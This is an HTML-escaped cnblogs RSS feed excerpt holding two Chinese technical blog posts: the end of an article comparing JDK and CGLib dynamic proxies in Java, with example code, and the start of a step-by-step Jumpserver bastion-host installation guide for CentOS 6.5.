&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;     } &lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;         &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InternalError(t.toString(), t);
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (NoSuchMethodException e) {
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;     &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InternalError(e.toString(), e);
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　以上就是通过JDK动态代理生成代理类的过程，其中会涉及到动态代理的缓存机制，以及代理类字节码的生成过程，由于比较复杂，在本文暂不做介绍。由此可以清楚的看到，JDK的动态代理底层是通过Java反射机制实现的，并且需要目标对象继承自一个接口才能生成它的代理类。&lt;/p&gt;
&lt;p&gt;　　接下来探讨另一种动态代理技术——CGLib。&lt;/p&gt;

&lt;p&gt;　　通过CGLib来创建一个代理需要引入jar包，其pom.xml依赖如下所示：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('d631a940-b802-4143-bf89-42f18537eb94')&quot; readability=&quot;31.5&quot;&gt;&lt;img id=&quot;code_img_closed_d631a940-b802-4143-bf89-42f18537eb94&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_d631a940-b802-4143-bf89-42f18537eb94&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('d631a940-b802-4143-bf89-42f18537eb94',event)&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_d631a940-b802-4143-bf89-42f18537eb94&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;58&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;cglib&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;cglib&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;3.2.4&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　前面提到了CGLib动态代理技术不需要目标对象实现自一个接口：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; cglibproxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt; * 目标对象（需要被代理的类）
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/6.
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; RealSubject {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; sayHello() {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;         System.out.println(&quot;hello&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　下面我们就使用CGLib代理这个类：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; cglibproxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; net.sf.cglib.proxy.Enhancer;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; net.sf.cglib.proxy.MethodInterceptor;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; net.sf.cglib.proxy.MethodProxy;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Method;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt; &lt;span&gt; * 代理类
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/6.
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ProxySubject &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; MethodInterceptor {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; Enhancer enhancer = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Enhancer();
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object getProxy(Class clazz) {
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;        enhancer.setSuperclass(clazz);
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;         enhancer.setCallback(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt; enhancer.create();    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;用于创建无参的目标对象代理类，对于有参构造器则调用Enhancer.create(Class[] argumentTypes, Object[] arguments)，第一个参数表示参数类型，第二个参数表示参数的值。&lt;/span&gt;
&lt;span&gt;20&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; 
&lt;span&gt;22&lt;/span&gt; &lt;span&gt;    @Override
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; Object intercept(Object object, Method method, Object[] args, MethodProxy methodProxy) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Throwable {
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;         System.out.println(&quot;调用前&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;         Object result =&lt;span&gt; methodProxy.invokeSuper(object, args);
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt;         System.out.println(&quot;调用后&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; result;
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　可以看到同样是需要实现一个接口——MethodIntercept，并且实现一个和invoke类似的方法——intercept。&lt;/p&gt;
&lt;p&gt;　　加入测试代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; cglibproxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/6.
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Main {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;         RealSubject subject = (RealSubject) &lt;span&gt;new&lt;/span&gt; ProxySubject().getProxy(RealSubject.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;        subject.sayHello();
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;        System.out.println(subject.getClass().getName());
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　执行结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/630246/201711/630246-20171109230717388-241819521.png&quot; alt=&quot;&quot; width=&quot;369&quot; height=&quot;77&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　可以看到的执行结果和JDK动态代理的结果一样，不同的是代理类的类型是cglibproxy.RealSubject$$EnhancerByCGLIB$$cb568e93。接着我们来看CGLib是如何生成代理类的。&lt;/p&gt;
&lt;p&gt;　　生成代理类的是ProxySubject类中的getProxy方法，而其中又是传入两个参数：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
enhancer.setSuperclass(clazz);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置需要代理的类&lt;/span&gt;
enhancer.setCallback(&lt;span&gt;this&lt;/span&gt;);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置回调方法&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　参数设置好后就调用enhancer.create()方法创建代理类。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object create() {
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     classOnly = &lt;span&gt;false&lt;/span&gt;;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;这个字段设置为false表示返回的是具体的Object代理类，在createClass()方法中设置的是classOnly=true表示的返回class类型的代理类。&lt;/span&gt;
&lt;span&gt;3&lt;/span&gt;     argumentTypes = &lt;span&gt;null&lt;/span&gt;;        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建的是无参目标对象的代理类，故没有参数，所以参数类型设置为null&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt;&lt;span&gt; createHelper();
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　看来还在调用一个叫createHelper的方法。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object createHelper() {
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     preValidate();        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;提前作一些校验
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;    &lt;span&gt;//
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;    ……
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; preValidate() {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (callbackTypes == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         callbackTypes = CallbackInfo.determineTypes(callbacks, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;         validateCallbackTypes = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     }    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;检查回调方法是否为空&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (filter == &lt;span&gt;null&lt;/span&gt;) {    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;检查是否设置过滤器，如果设置了多个回调方法就需要设置过滤器&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (callbackTypes.length &amp;gt; 1&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;             &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalStateException(&quot;Multiple callback types possible but no filter specified&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         filter =&lt;span&gt; ALL_ZERO;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　接着查看createHelper的剩余代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object createHelper() {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;    preValidate();
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     Object key = KEY_FACTORY.newInstance((superclass != &lt;span&gt;null&lt;/span&gt;) ? superclass.getName() : &lt;span&gt;null&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;            ReflectUtils.getNames(interfaces),
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;             filter == ALL_ZERO ? &lt;span&gt;null&lt;/span&gt; : &lt;span&gt;new&lt;/span&gt; WeakCacheKey&amp;lt;CallbackFilter&amp;gt;&lt;span&gt;(filter),
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;            callbackTypes,
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;            useFactory,
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;            interceptDuringConstruction,
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;            serialVersionUID);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;this&lt;/span&gt;.currentKey = key;        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;在CGLib中也使用到了缓存机制，这段代码也比较复杂，有关缓存的策略暂时也不做分析吧 &lt;/span&gt;
&lt;span&gt;11&lt;/span&gt;     Object result = &lt;span&gt;super&lt;/span&gt;.create(key);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;利用字节实现并创建代理类对象&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt;&lt;span&gt; result;
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　马马虎虎地只能说是介绍了JDK与CGLib两种动态代理技术，并没有很深入地研究，特别是在两者在缓存机制上的实现，略感遗憾。&lt;/p&gt;
&lt;p&gt;　　另外，在开头提到了CGLib的性能比JDK高，这实际上并不准确。或许这在特别条件下的确如此，因为在我实测发现JDK8的动态代理效率非常高，甚至略高于CGLib，但是在JDK6的环境下的效率就显得比较低了。所以，通常所说的CGLib性能比JDK动态代理要高，是传统的挂念，实际上Java一直都在不断优化动态代理性能，在比较高版本的JDK条件下可以放行大胆的使用JDK原生的动态代理。&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;这是一个能给程序员加buff的公众号 &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/630246/201710/630246-20171018224424427-1683168589.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 15:12:00 +0000</pubDate>
<dc:creator>余林丰</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yulinfeng/p/7811965.html</dc:identifier>
</item>
<item>
<title>Jumpserver部署与安装 - jks巴顿</title>
<link>http://www.cnblogs.com/jksbaduen/p/7811909.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jksbaduen/p/7811909.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;span&gt;完全开源，&lt;/span&gt;&lt;span&gt;GPL&lt;/span&gt;&lt;span&gt;授权&lt;/span&gt;&lt;span&gt; &lt;br/&gt;Python&lt;/span&gt;&lt;span&gt;编写，容易再次开发&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;实现了跳板机基本功能，认证、授权、审计&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;集成了&lt;/span&gt;&lt;span&gt;Ansible&lt;/span&gt;&lt;span&gt;，批量命令等&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;支持&lt;/span&gt;&lt;span&gt;WebTerminal &lt;br/&gt;Bootstrap&lt;/span&gt;&lt;span&gt;编写，界面美观&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;自动收集硬件信息&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;录像回放&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;命令搜索&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;实时监控&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;批量上传下载&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;span&gt;相对于&lt;/span&gt; &lt;span&gt;jumpserver 2.0&lt;/span&gt; &lt;span&gt;版本，在新的版本&lt;/span&gt; &lt;span&gt;3.0&lt;/span&gt; &lt;span&gt;中取消了&lt;/span&gt;&lt;span&gt;LDAP&lt;/span&gt;&lt;span&gt;授权，取而代之的是&lt;/span&gt;&lt;span&gt;ssh&lt;/span&gt;&lt;span&gt;进行推送；界面也有所变化，功能更完善，安装更简单，不像&lt;/span&gt; &lt;span&gt;2.0&lt;/span&gt; &lt;span&gt;的版本，难住了好多人。下面通过两台主机来搭建&lt;/span&gt; &lt;span&gt;jumpserver&lt;/span&gt;&lt;span&gt;堡垒机！&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;环境：&lt;/span&gt;&lt;span&gt; &lt;br/&gt;Centos 6.5 x86_64 &lt;br/&gt;&lt;/span&gt;&lt;span&gt;关闭&lt;/span&gt; &lt;span&gt;iptables&lt;/span&gt;&lt;span&gt;，关闭&lt;/span&gt; &lt;span&gt;selinux &lt;br/&gt;jumpserver&lt;/span&gt;&lt;span&gt;：&lt;/span&gt;&lt;span&gt;192.168.1.200 &lt;br/&gt;clients&lt;/span&gt;&lt;span&gt;：&lt;/span&gt;&lt;span&gt;192.168.1.210 &lt;br/&gt;ps&lt;/span&gt;&lt;span&gt;：操作只针对&lt;/span&gt; &lt;span&gt;jumpserver&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;clients&lt;/span&gt; &lt;span&gt;不会进行操作，只是环境需求。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;
&lt;h2&gt;安装依赖包 &lt;/h2&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;ol readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;yum -y install epel-release?&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;yum clean all &amp;amp;&amp;amp; yum makecache?&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span&gt;yum -y update?&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;span&gt;yum -y install git python-pip mysql-devel gcc automake autoconf python-devel vim sshpass lrzsz readline-devel&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;二、下载 jumpserver &lt;br/&gt;cd /opt &lt;br/&gt;git clone &lt;a href=&quot;https://github.com/jumpserver/jumpserver.git&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;https://github.com/jumpserver/jumpserver.git&lt;/span&gt;&lt;/a&gt; &lt;br/&gt;注： 如果下载失败，则去github上面下载zip包，unzip解压缩即可&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230339544-1677261301.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;三、执行快速安装脚本 &lt;br/&gt;cd /opt/jumpserver/install&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;pip install -r requirements.txt&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;注意 requirements.txt 有可能不在 install下 ，可以到上级目录中查找一下 或者用 find的在上级目录中查找&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230340747-36098268.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;查看安装的包 pip freeze&lt;/p&gt;
&lt;p&gt;python install.py &lt;br/&gt;输入jumpserver的地址，默认为：&quot;&lt;span&gt;192.168.1.210&lt;/span&gt;&quot;，回车即可 &lt;br/&gt;是否安装MySQL：选择&quot;y&quot;进行安装&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230341153-1449591510.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;MySQL 启动后会要求用户输入 邮件服务器及账户（后期用来发送用户名、ssh pass、web pass、ssh key）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230341888-662490864.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;输入smtp信息之后发现报错了，是python的pycrypto模块问题，需要卸载重装： &lt;br/&gt;pip uninstall pycrypto &lt;br/&gt;easy_install pycrypto&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230342184-1712305773.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230342450-1446825371.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230342716-1936288924.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230343013-1994034267.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;安装之后继续 python install.py 进行安装，并且输入 web管理员用户名和管理员密码，ok&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230343997-1544018180.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230344294-1835653147.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;运行 crontab，定期处理失效连接，定期更新资产信息 &lt;br/&gt;cd /opt/jumpserver &lt;br/&gt;python manage.py crontab add&lt;/p&gt;
&lt;p&gt;安装 Jinja模块&lt;/p&gt;
&lt;ol readability=&quot;-0.5&quot;&gt;&lt;li&gt;
&lt;p&gt;&lt;span&gt;cd /server/tools&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;span&gt;wget https:&lt;span&gt;//pypi.python.org/packages/47/83/679b5592feb54e948d6599edf5dac61d2991778c3ecbef6b8041663f4740/Jinja2-2.7.1.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;tar xf Jinja2-2.7.1.tar.gz&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span&gt;cd Jinja2-2.7.1&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span&gt;python setup.py install&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;配置端口&lt;/p&gt;
&lt;ol readability=&quot;-1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;cd /application/jumpserver/&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;python manage.py runserver 0.0.0.0:8000&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;重启服务&lt;/p&gt;
&lt;ol readability=&quot;-2&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;span&gt;cd /application/jumpserver/&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span&gt;./service.sh restart&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;jumpserver操作指南&lt;/p&gt;
&lt;p&gt;浏览器访问服务器http：&lt;span&gt;192.168.1.210&lt;/span&gt;使用之前设置的用户名和密码登陆。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230344653-1035800190.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230345747-1523238559.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;&lt;span&gt;  &lt;/span&gt;一、用户管理&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）添加用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击用户管理&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;查看用户&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;添加用户&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
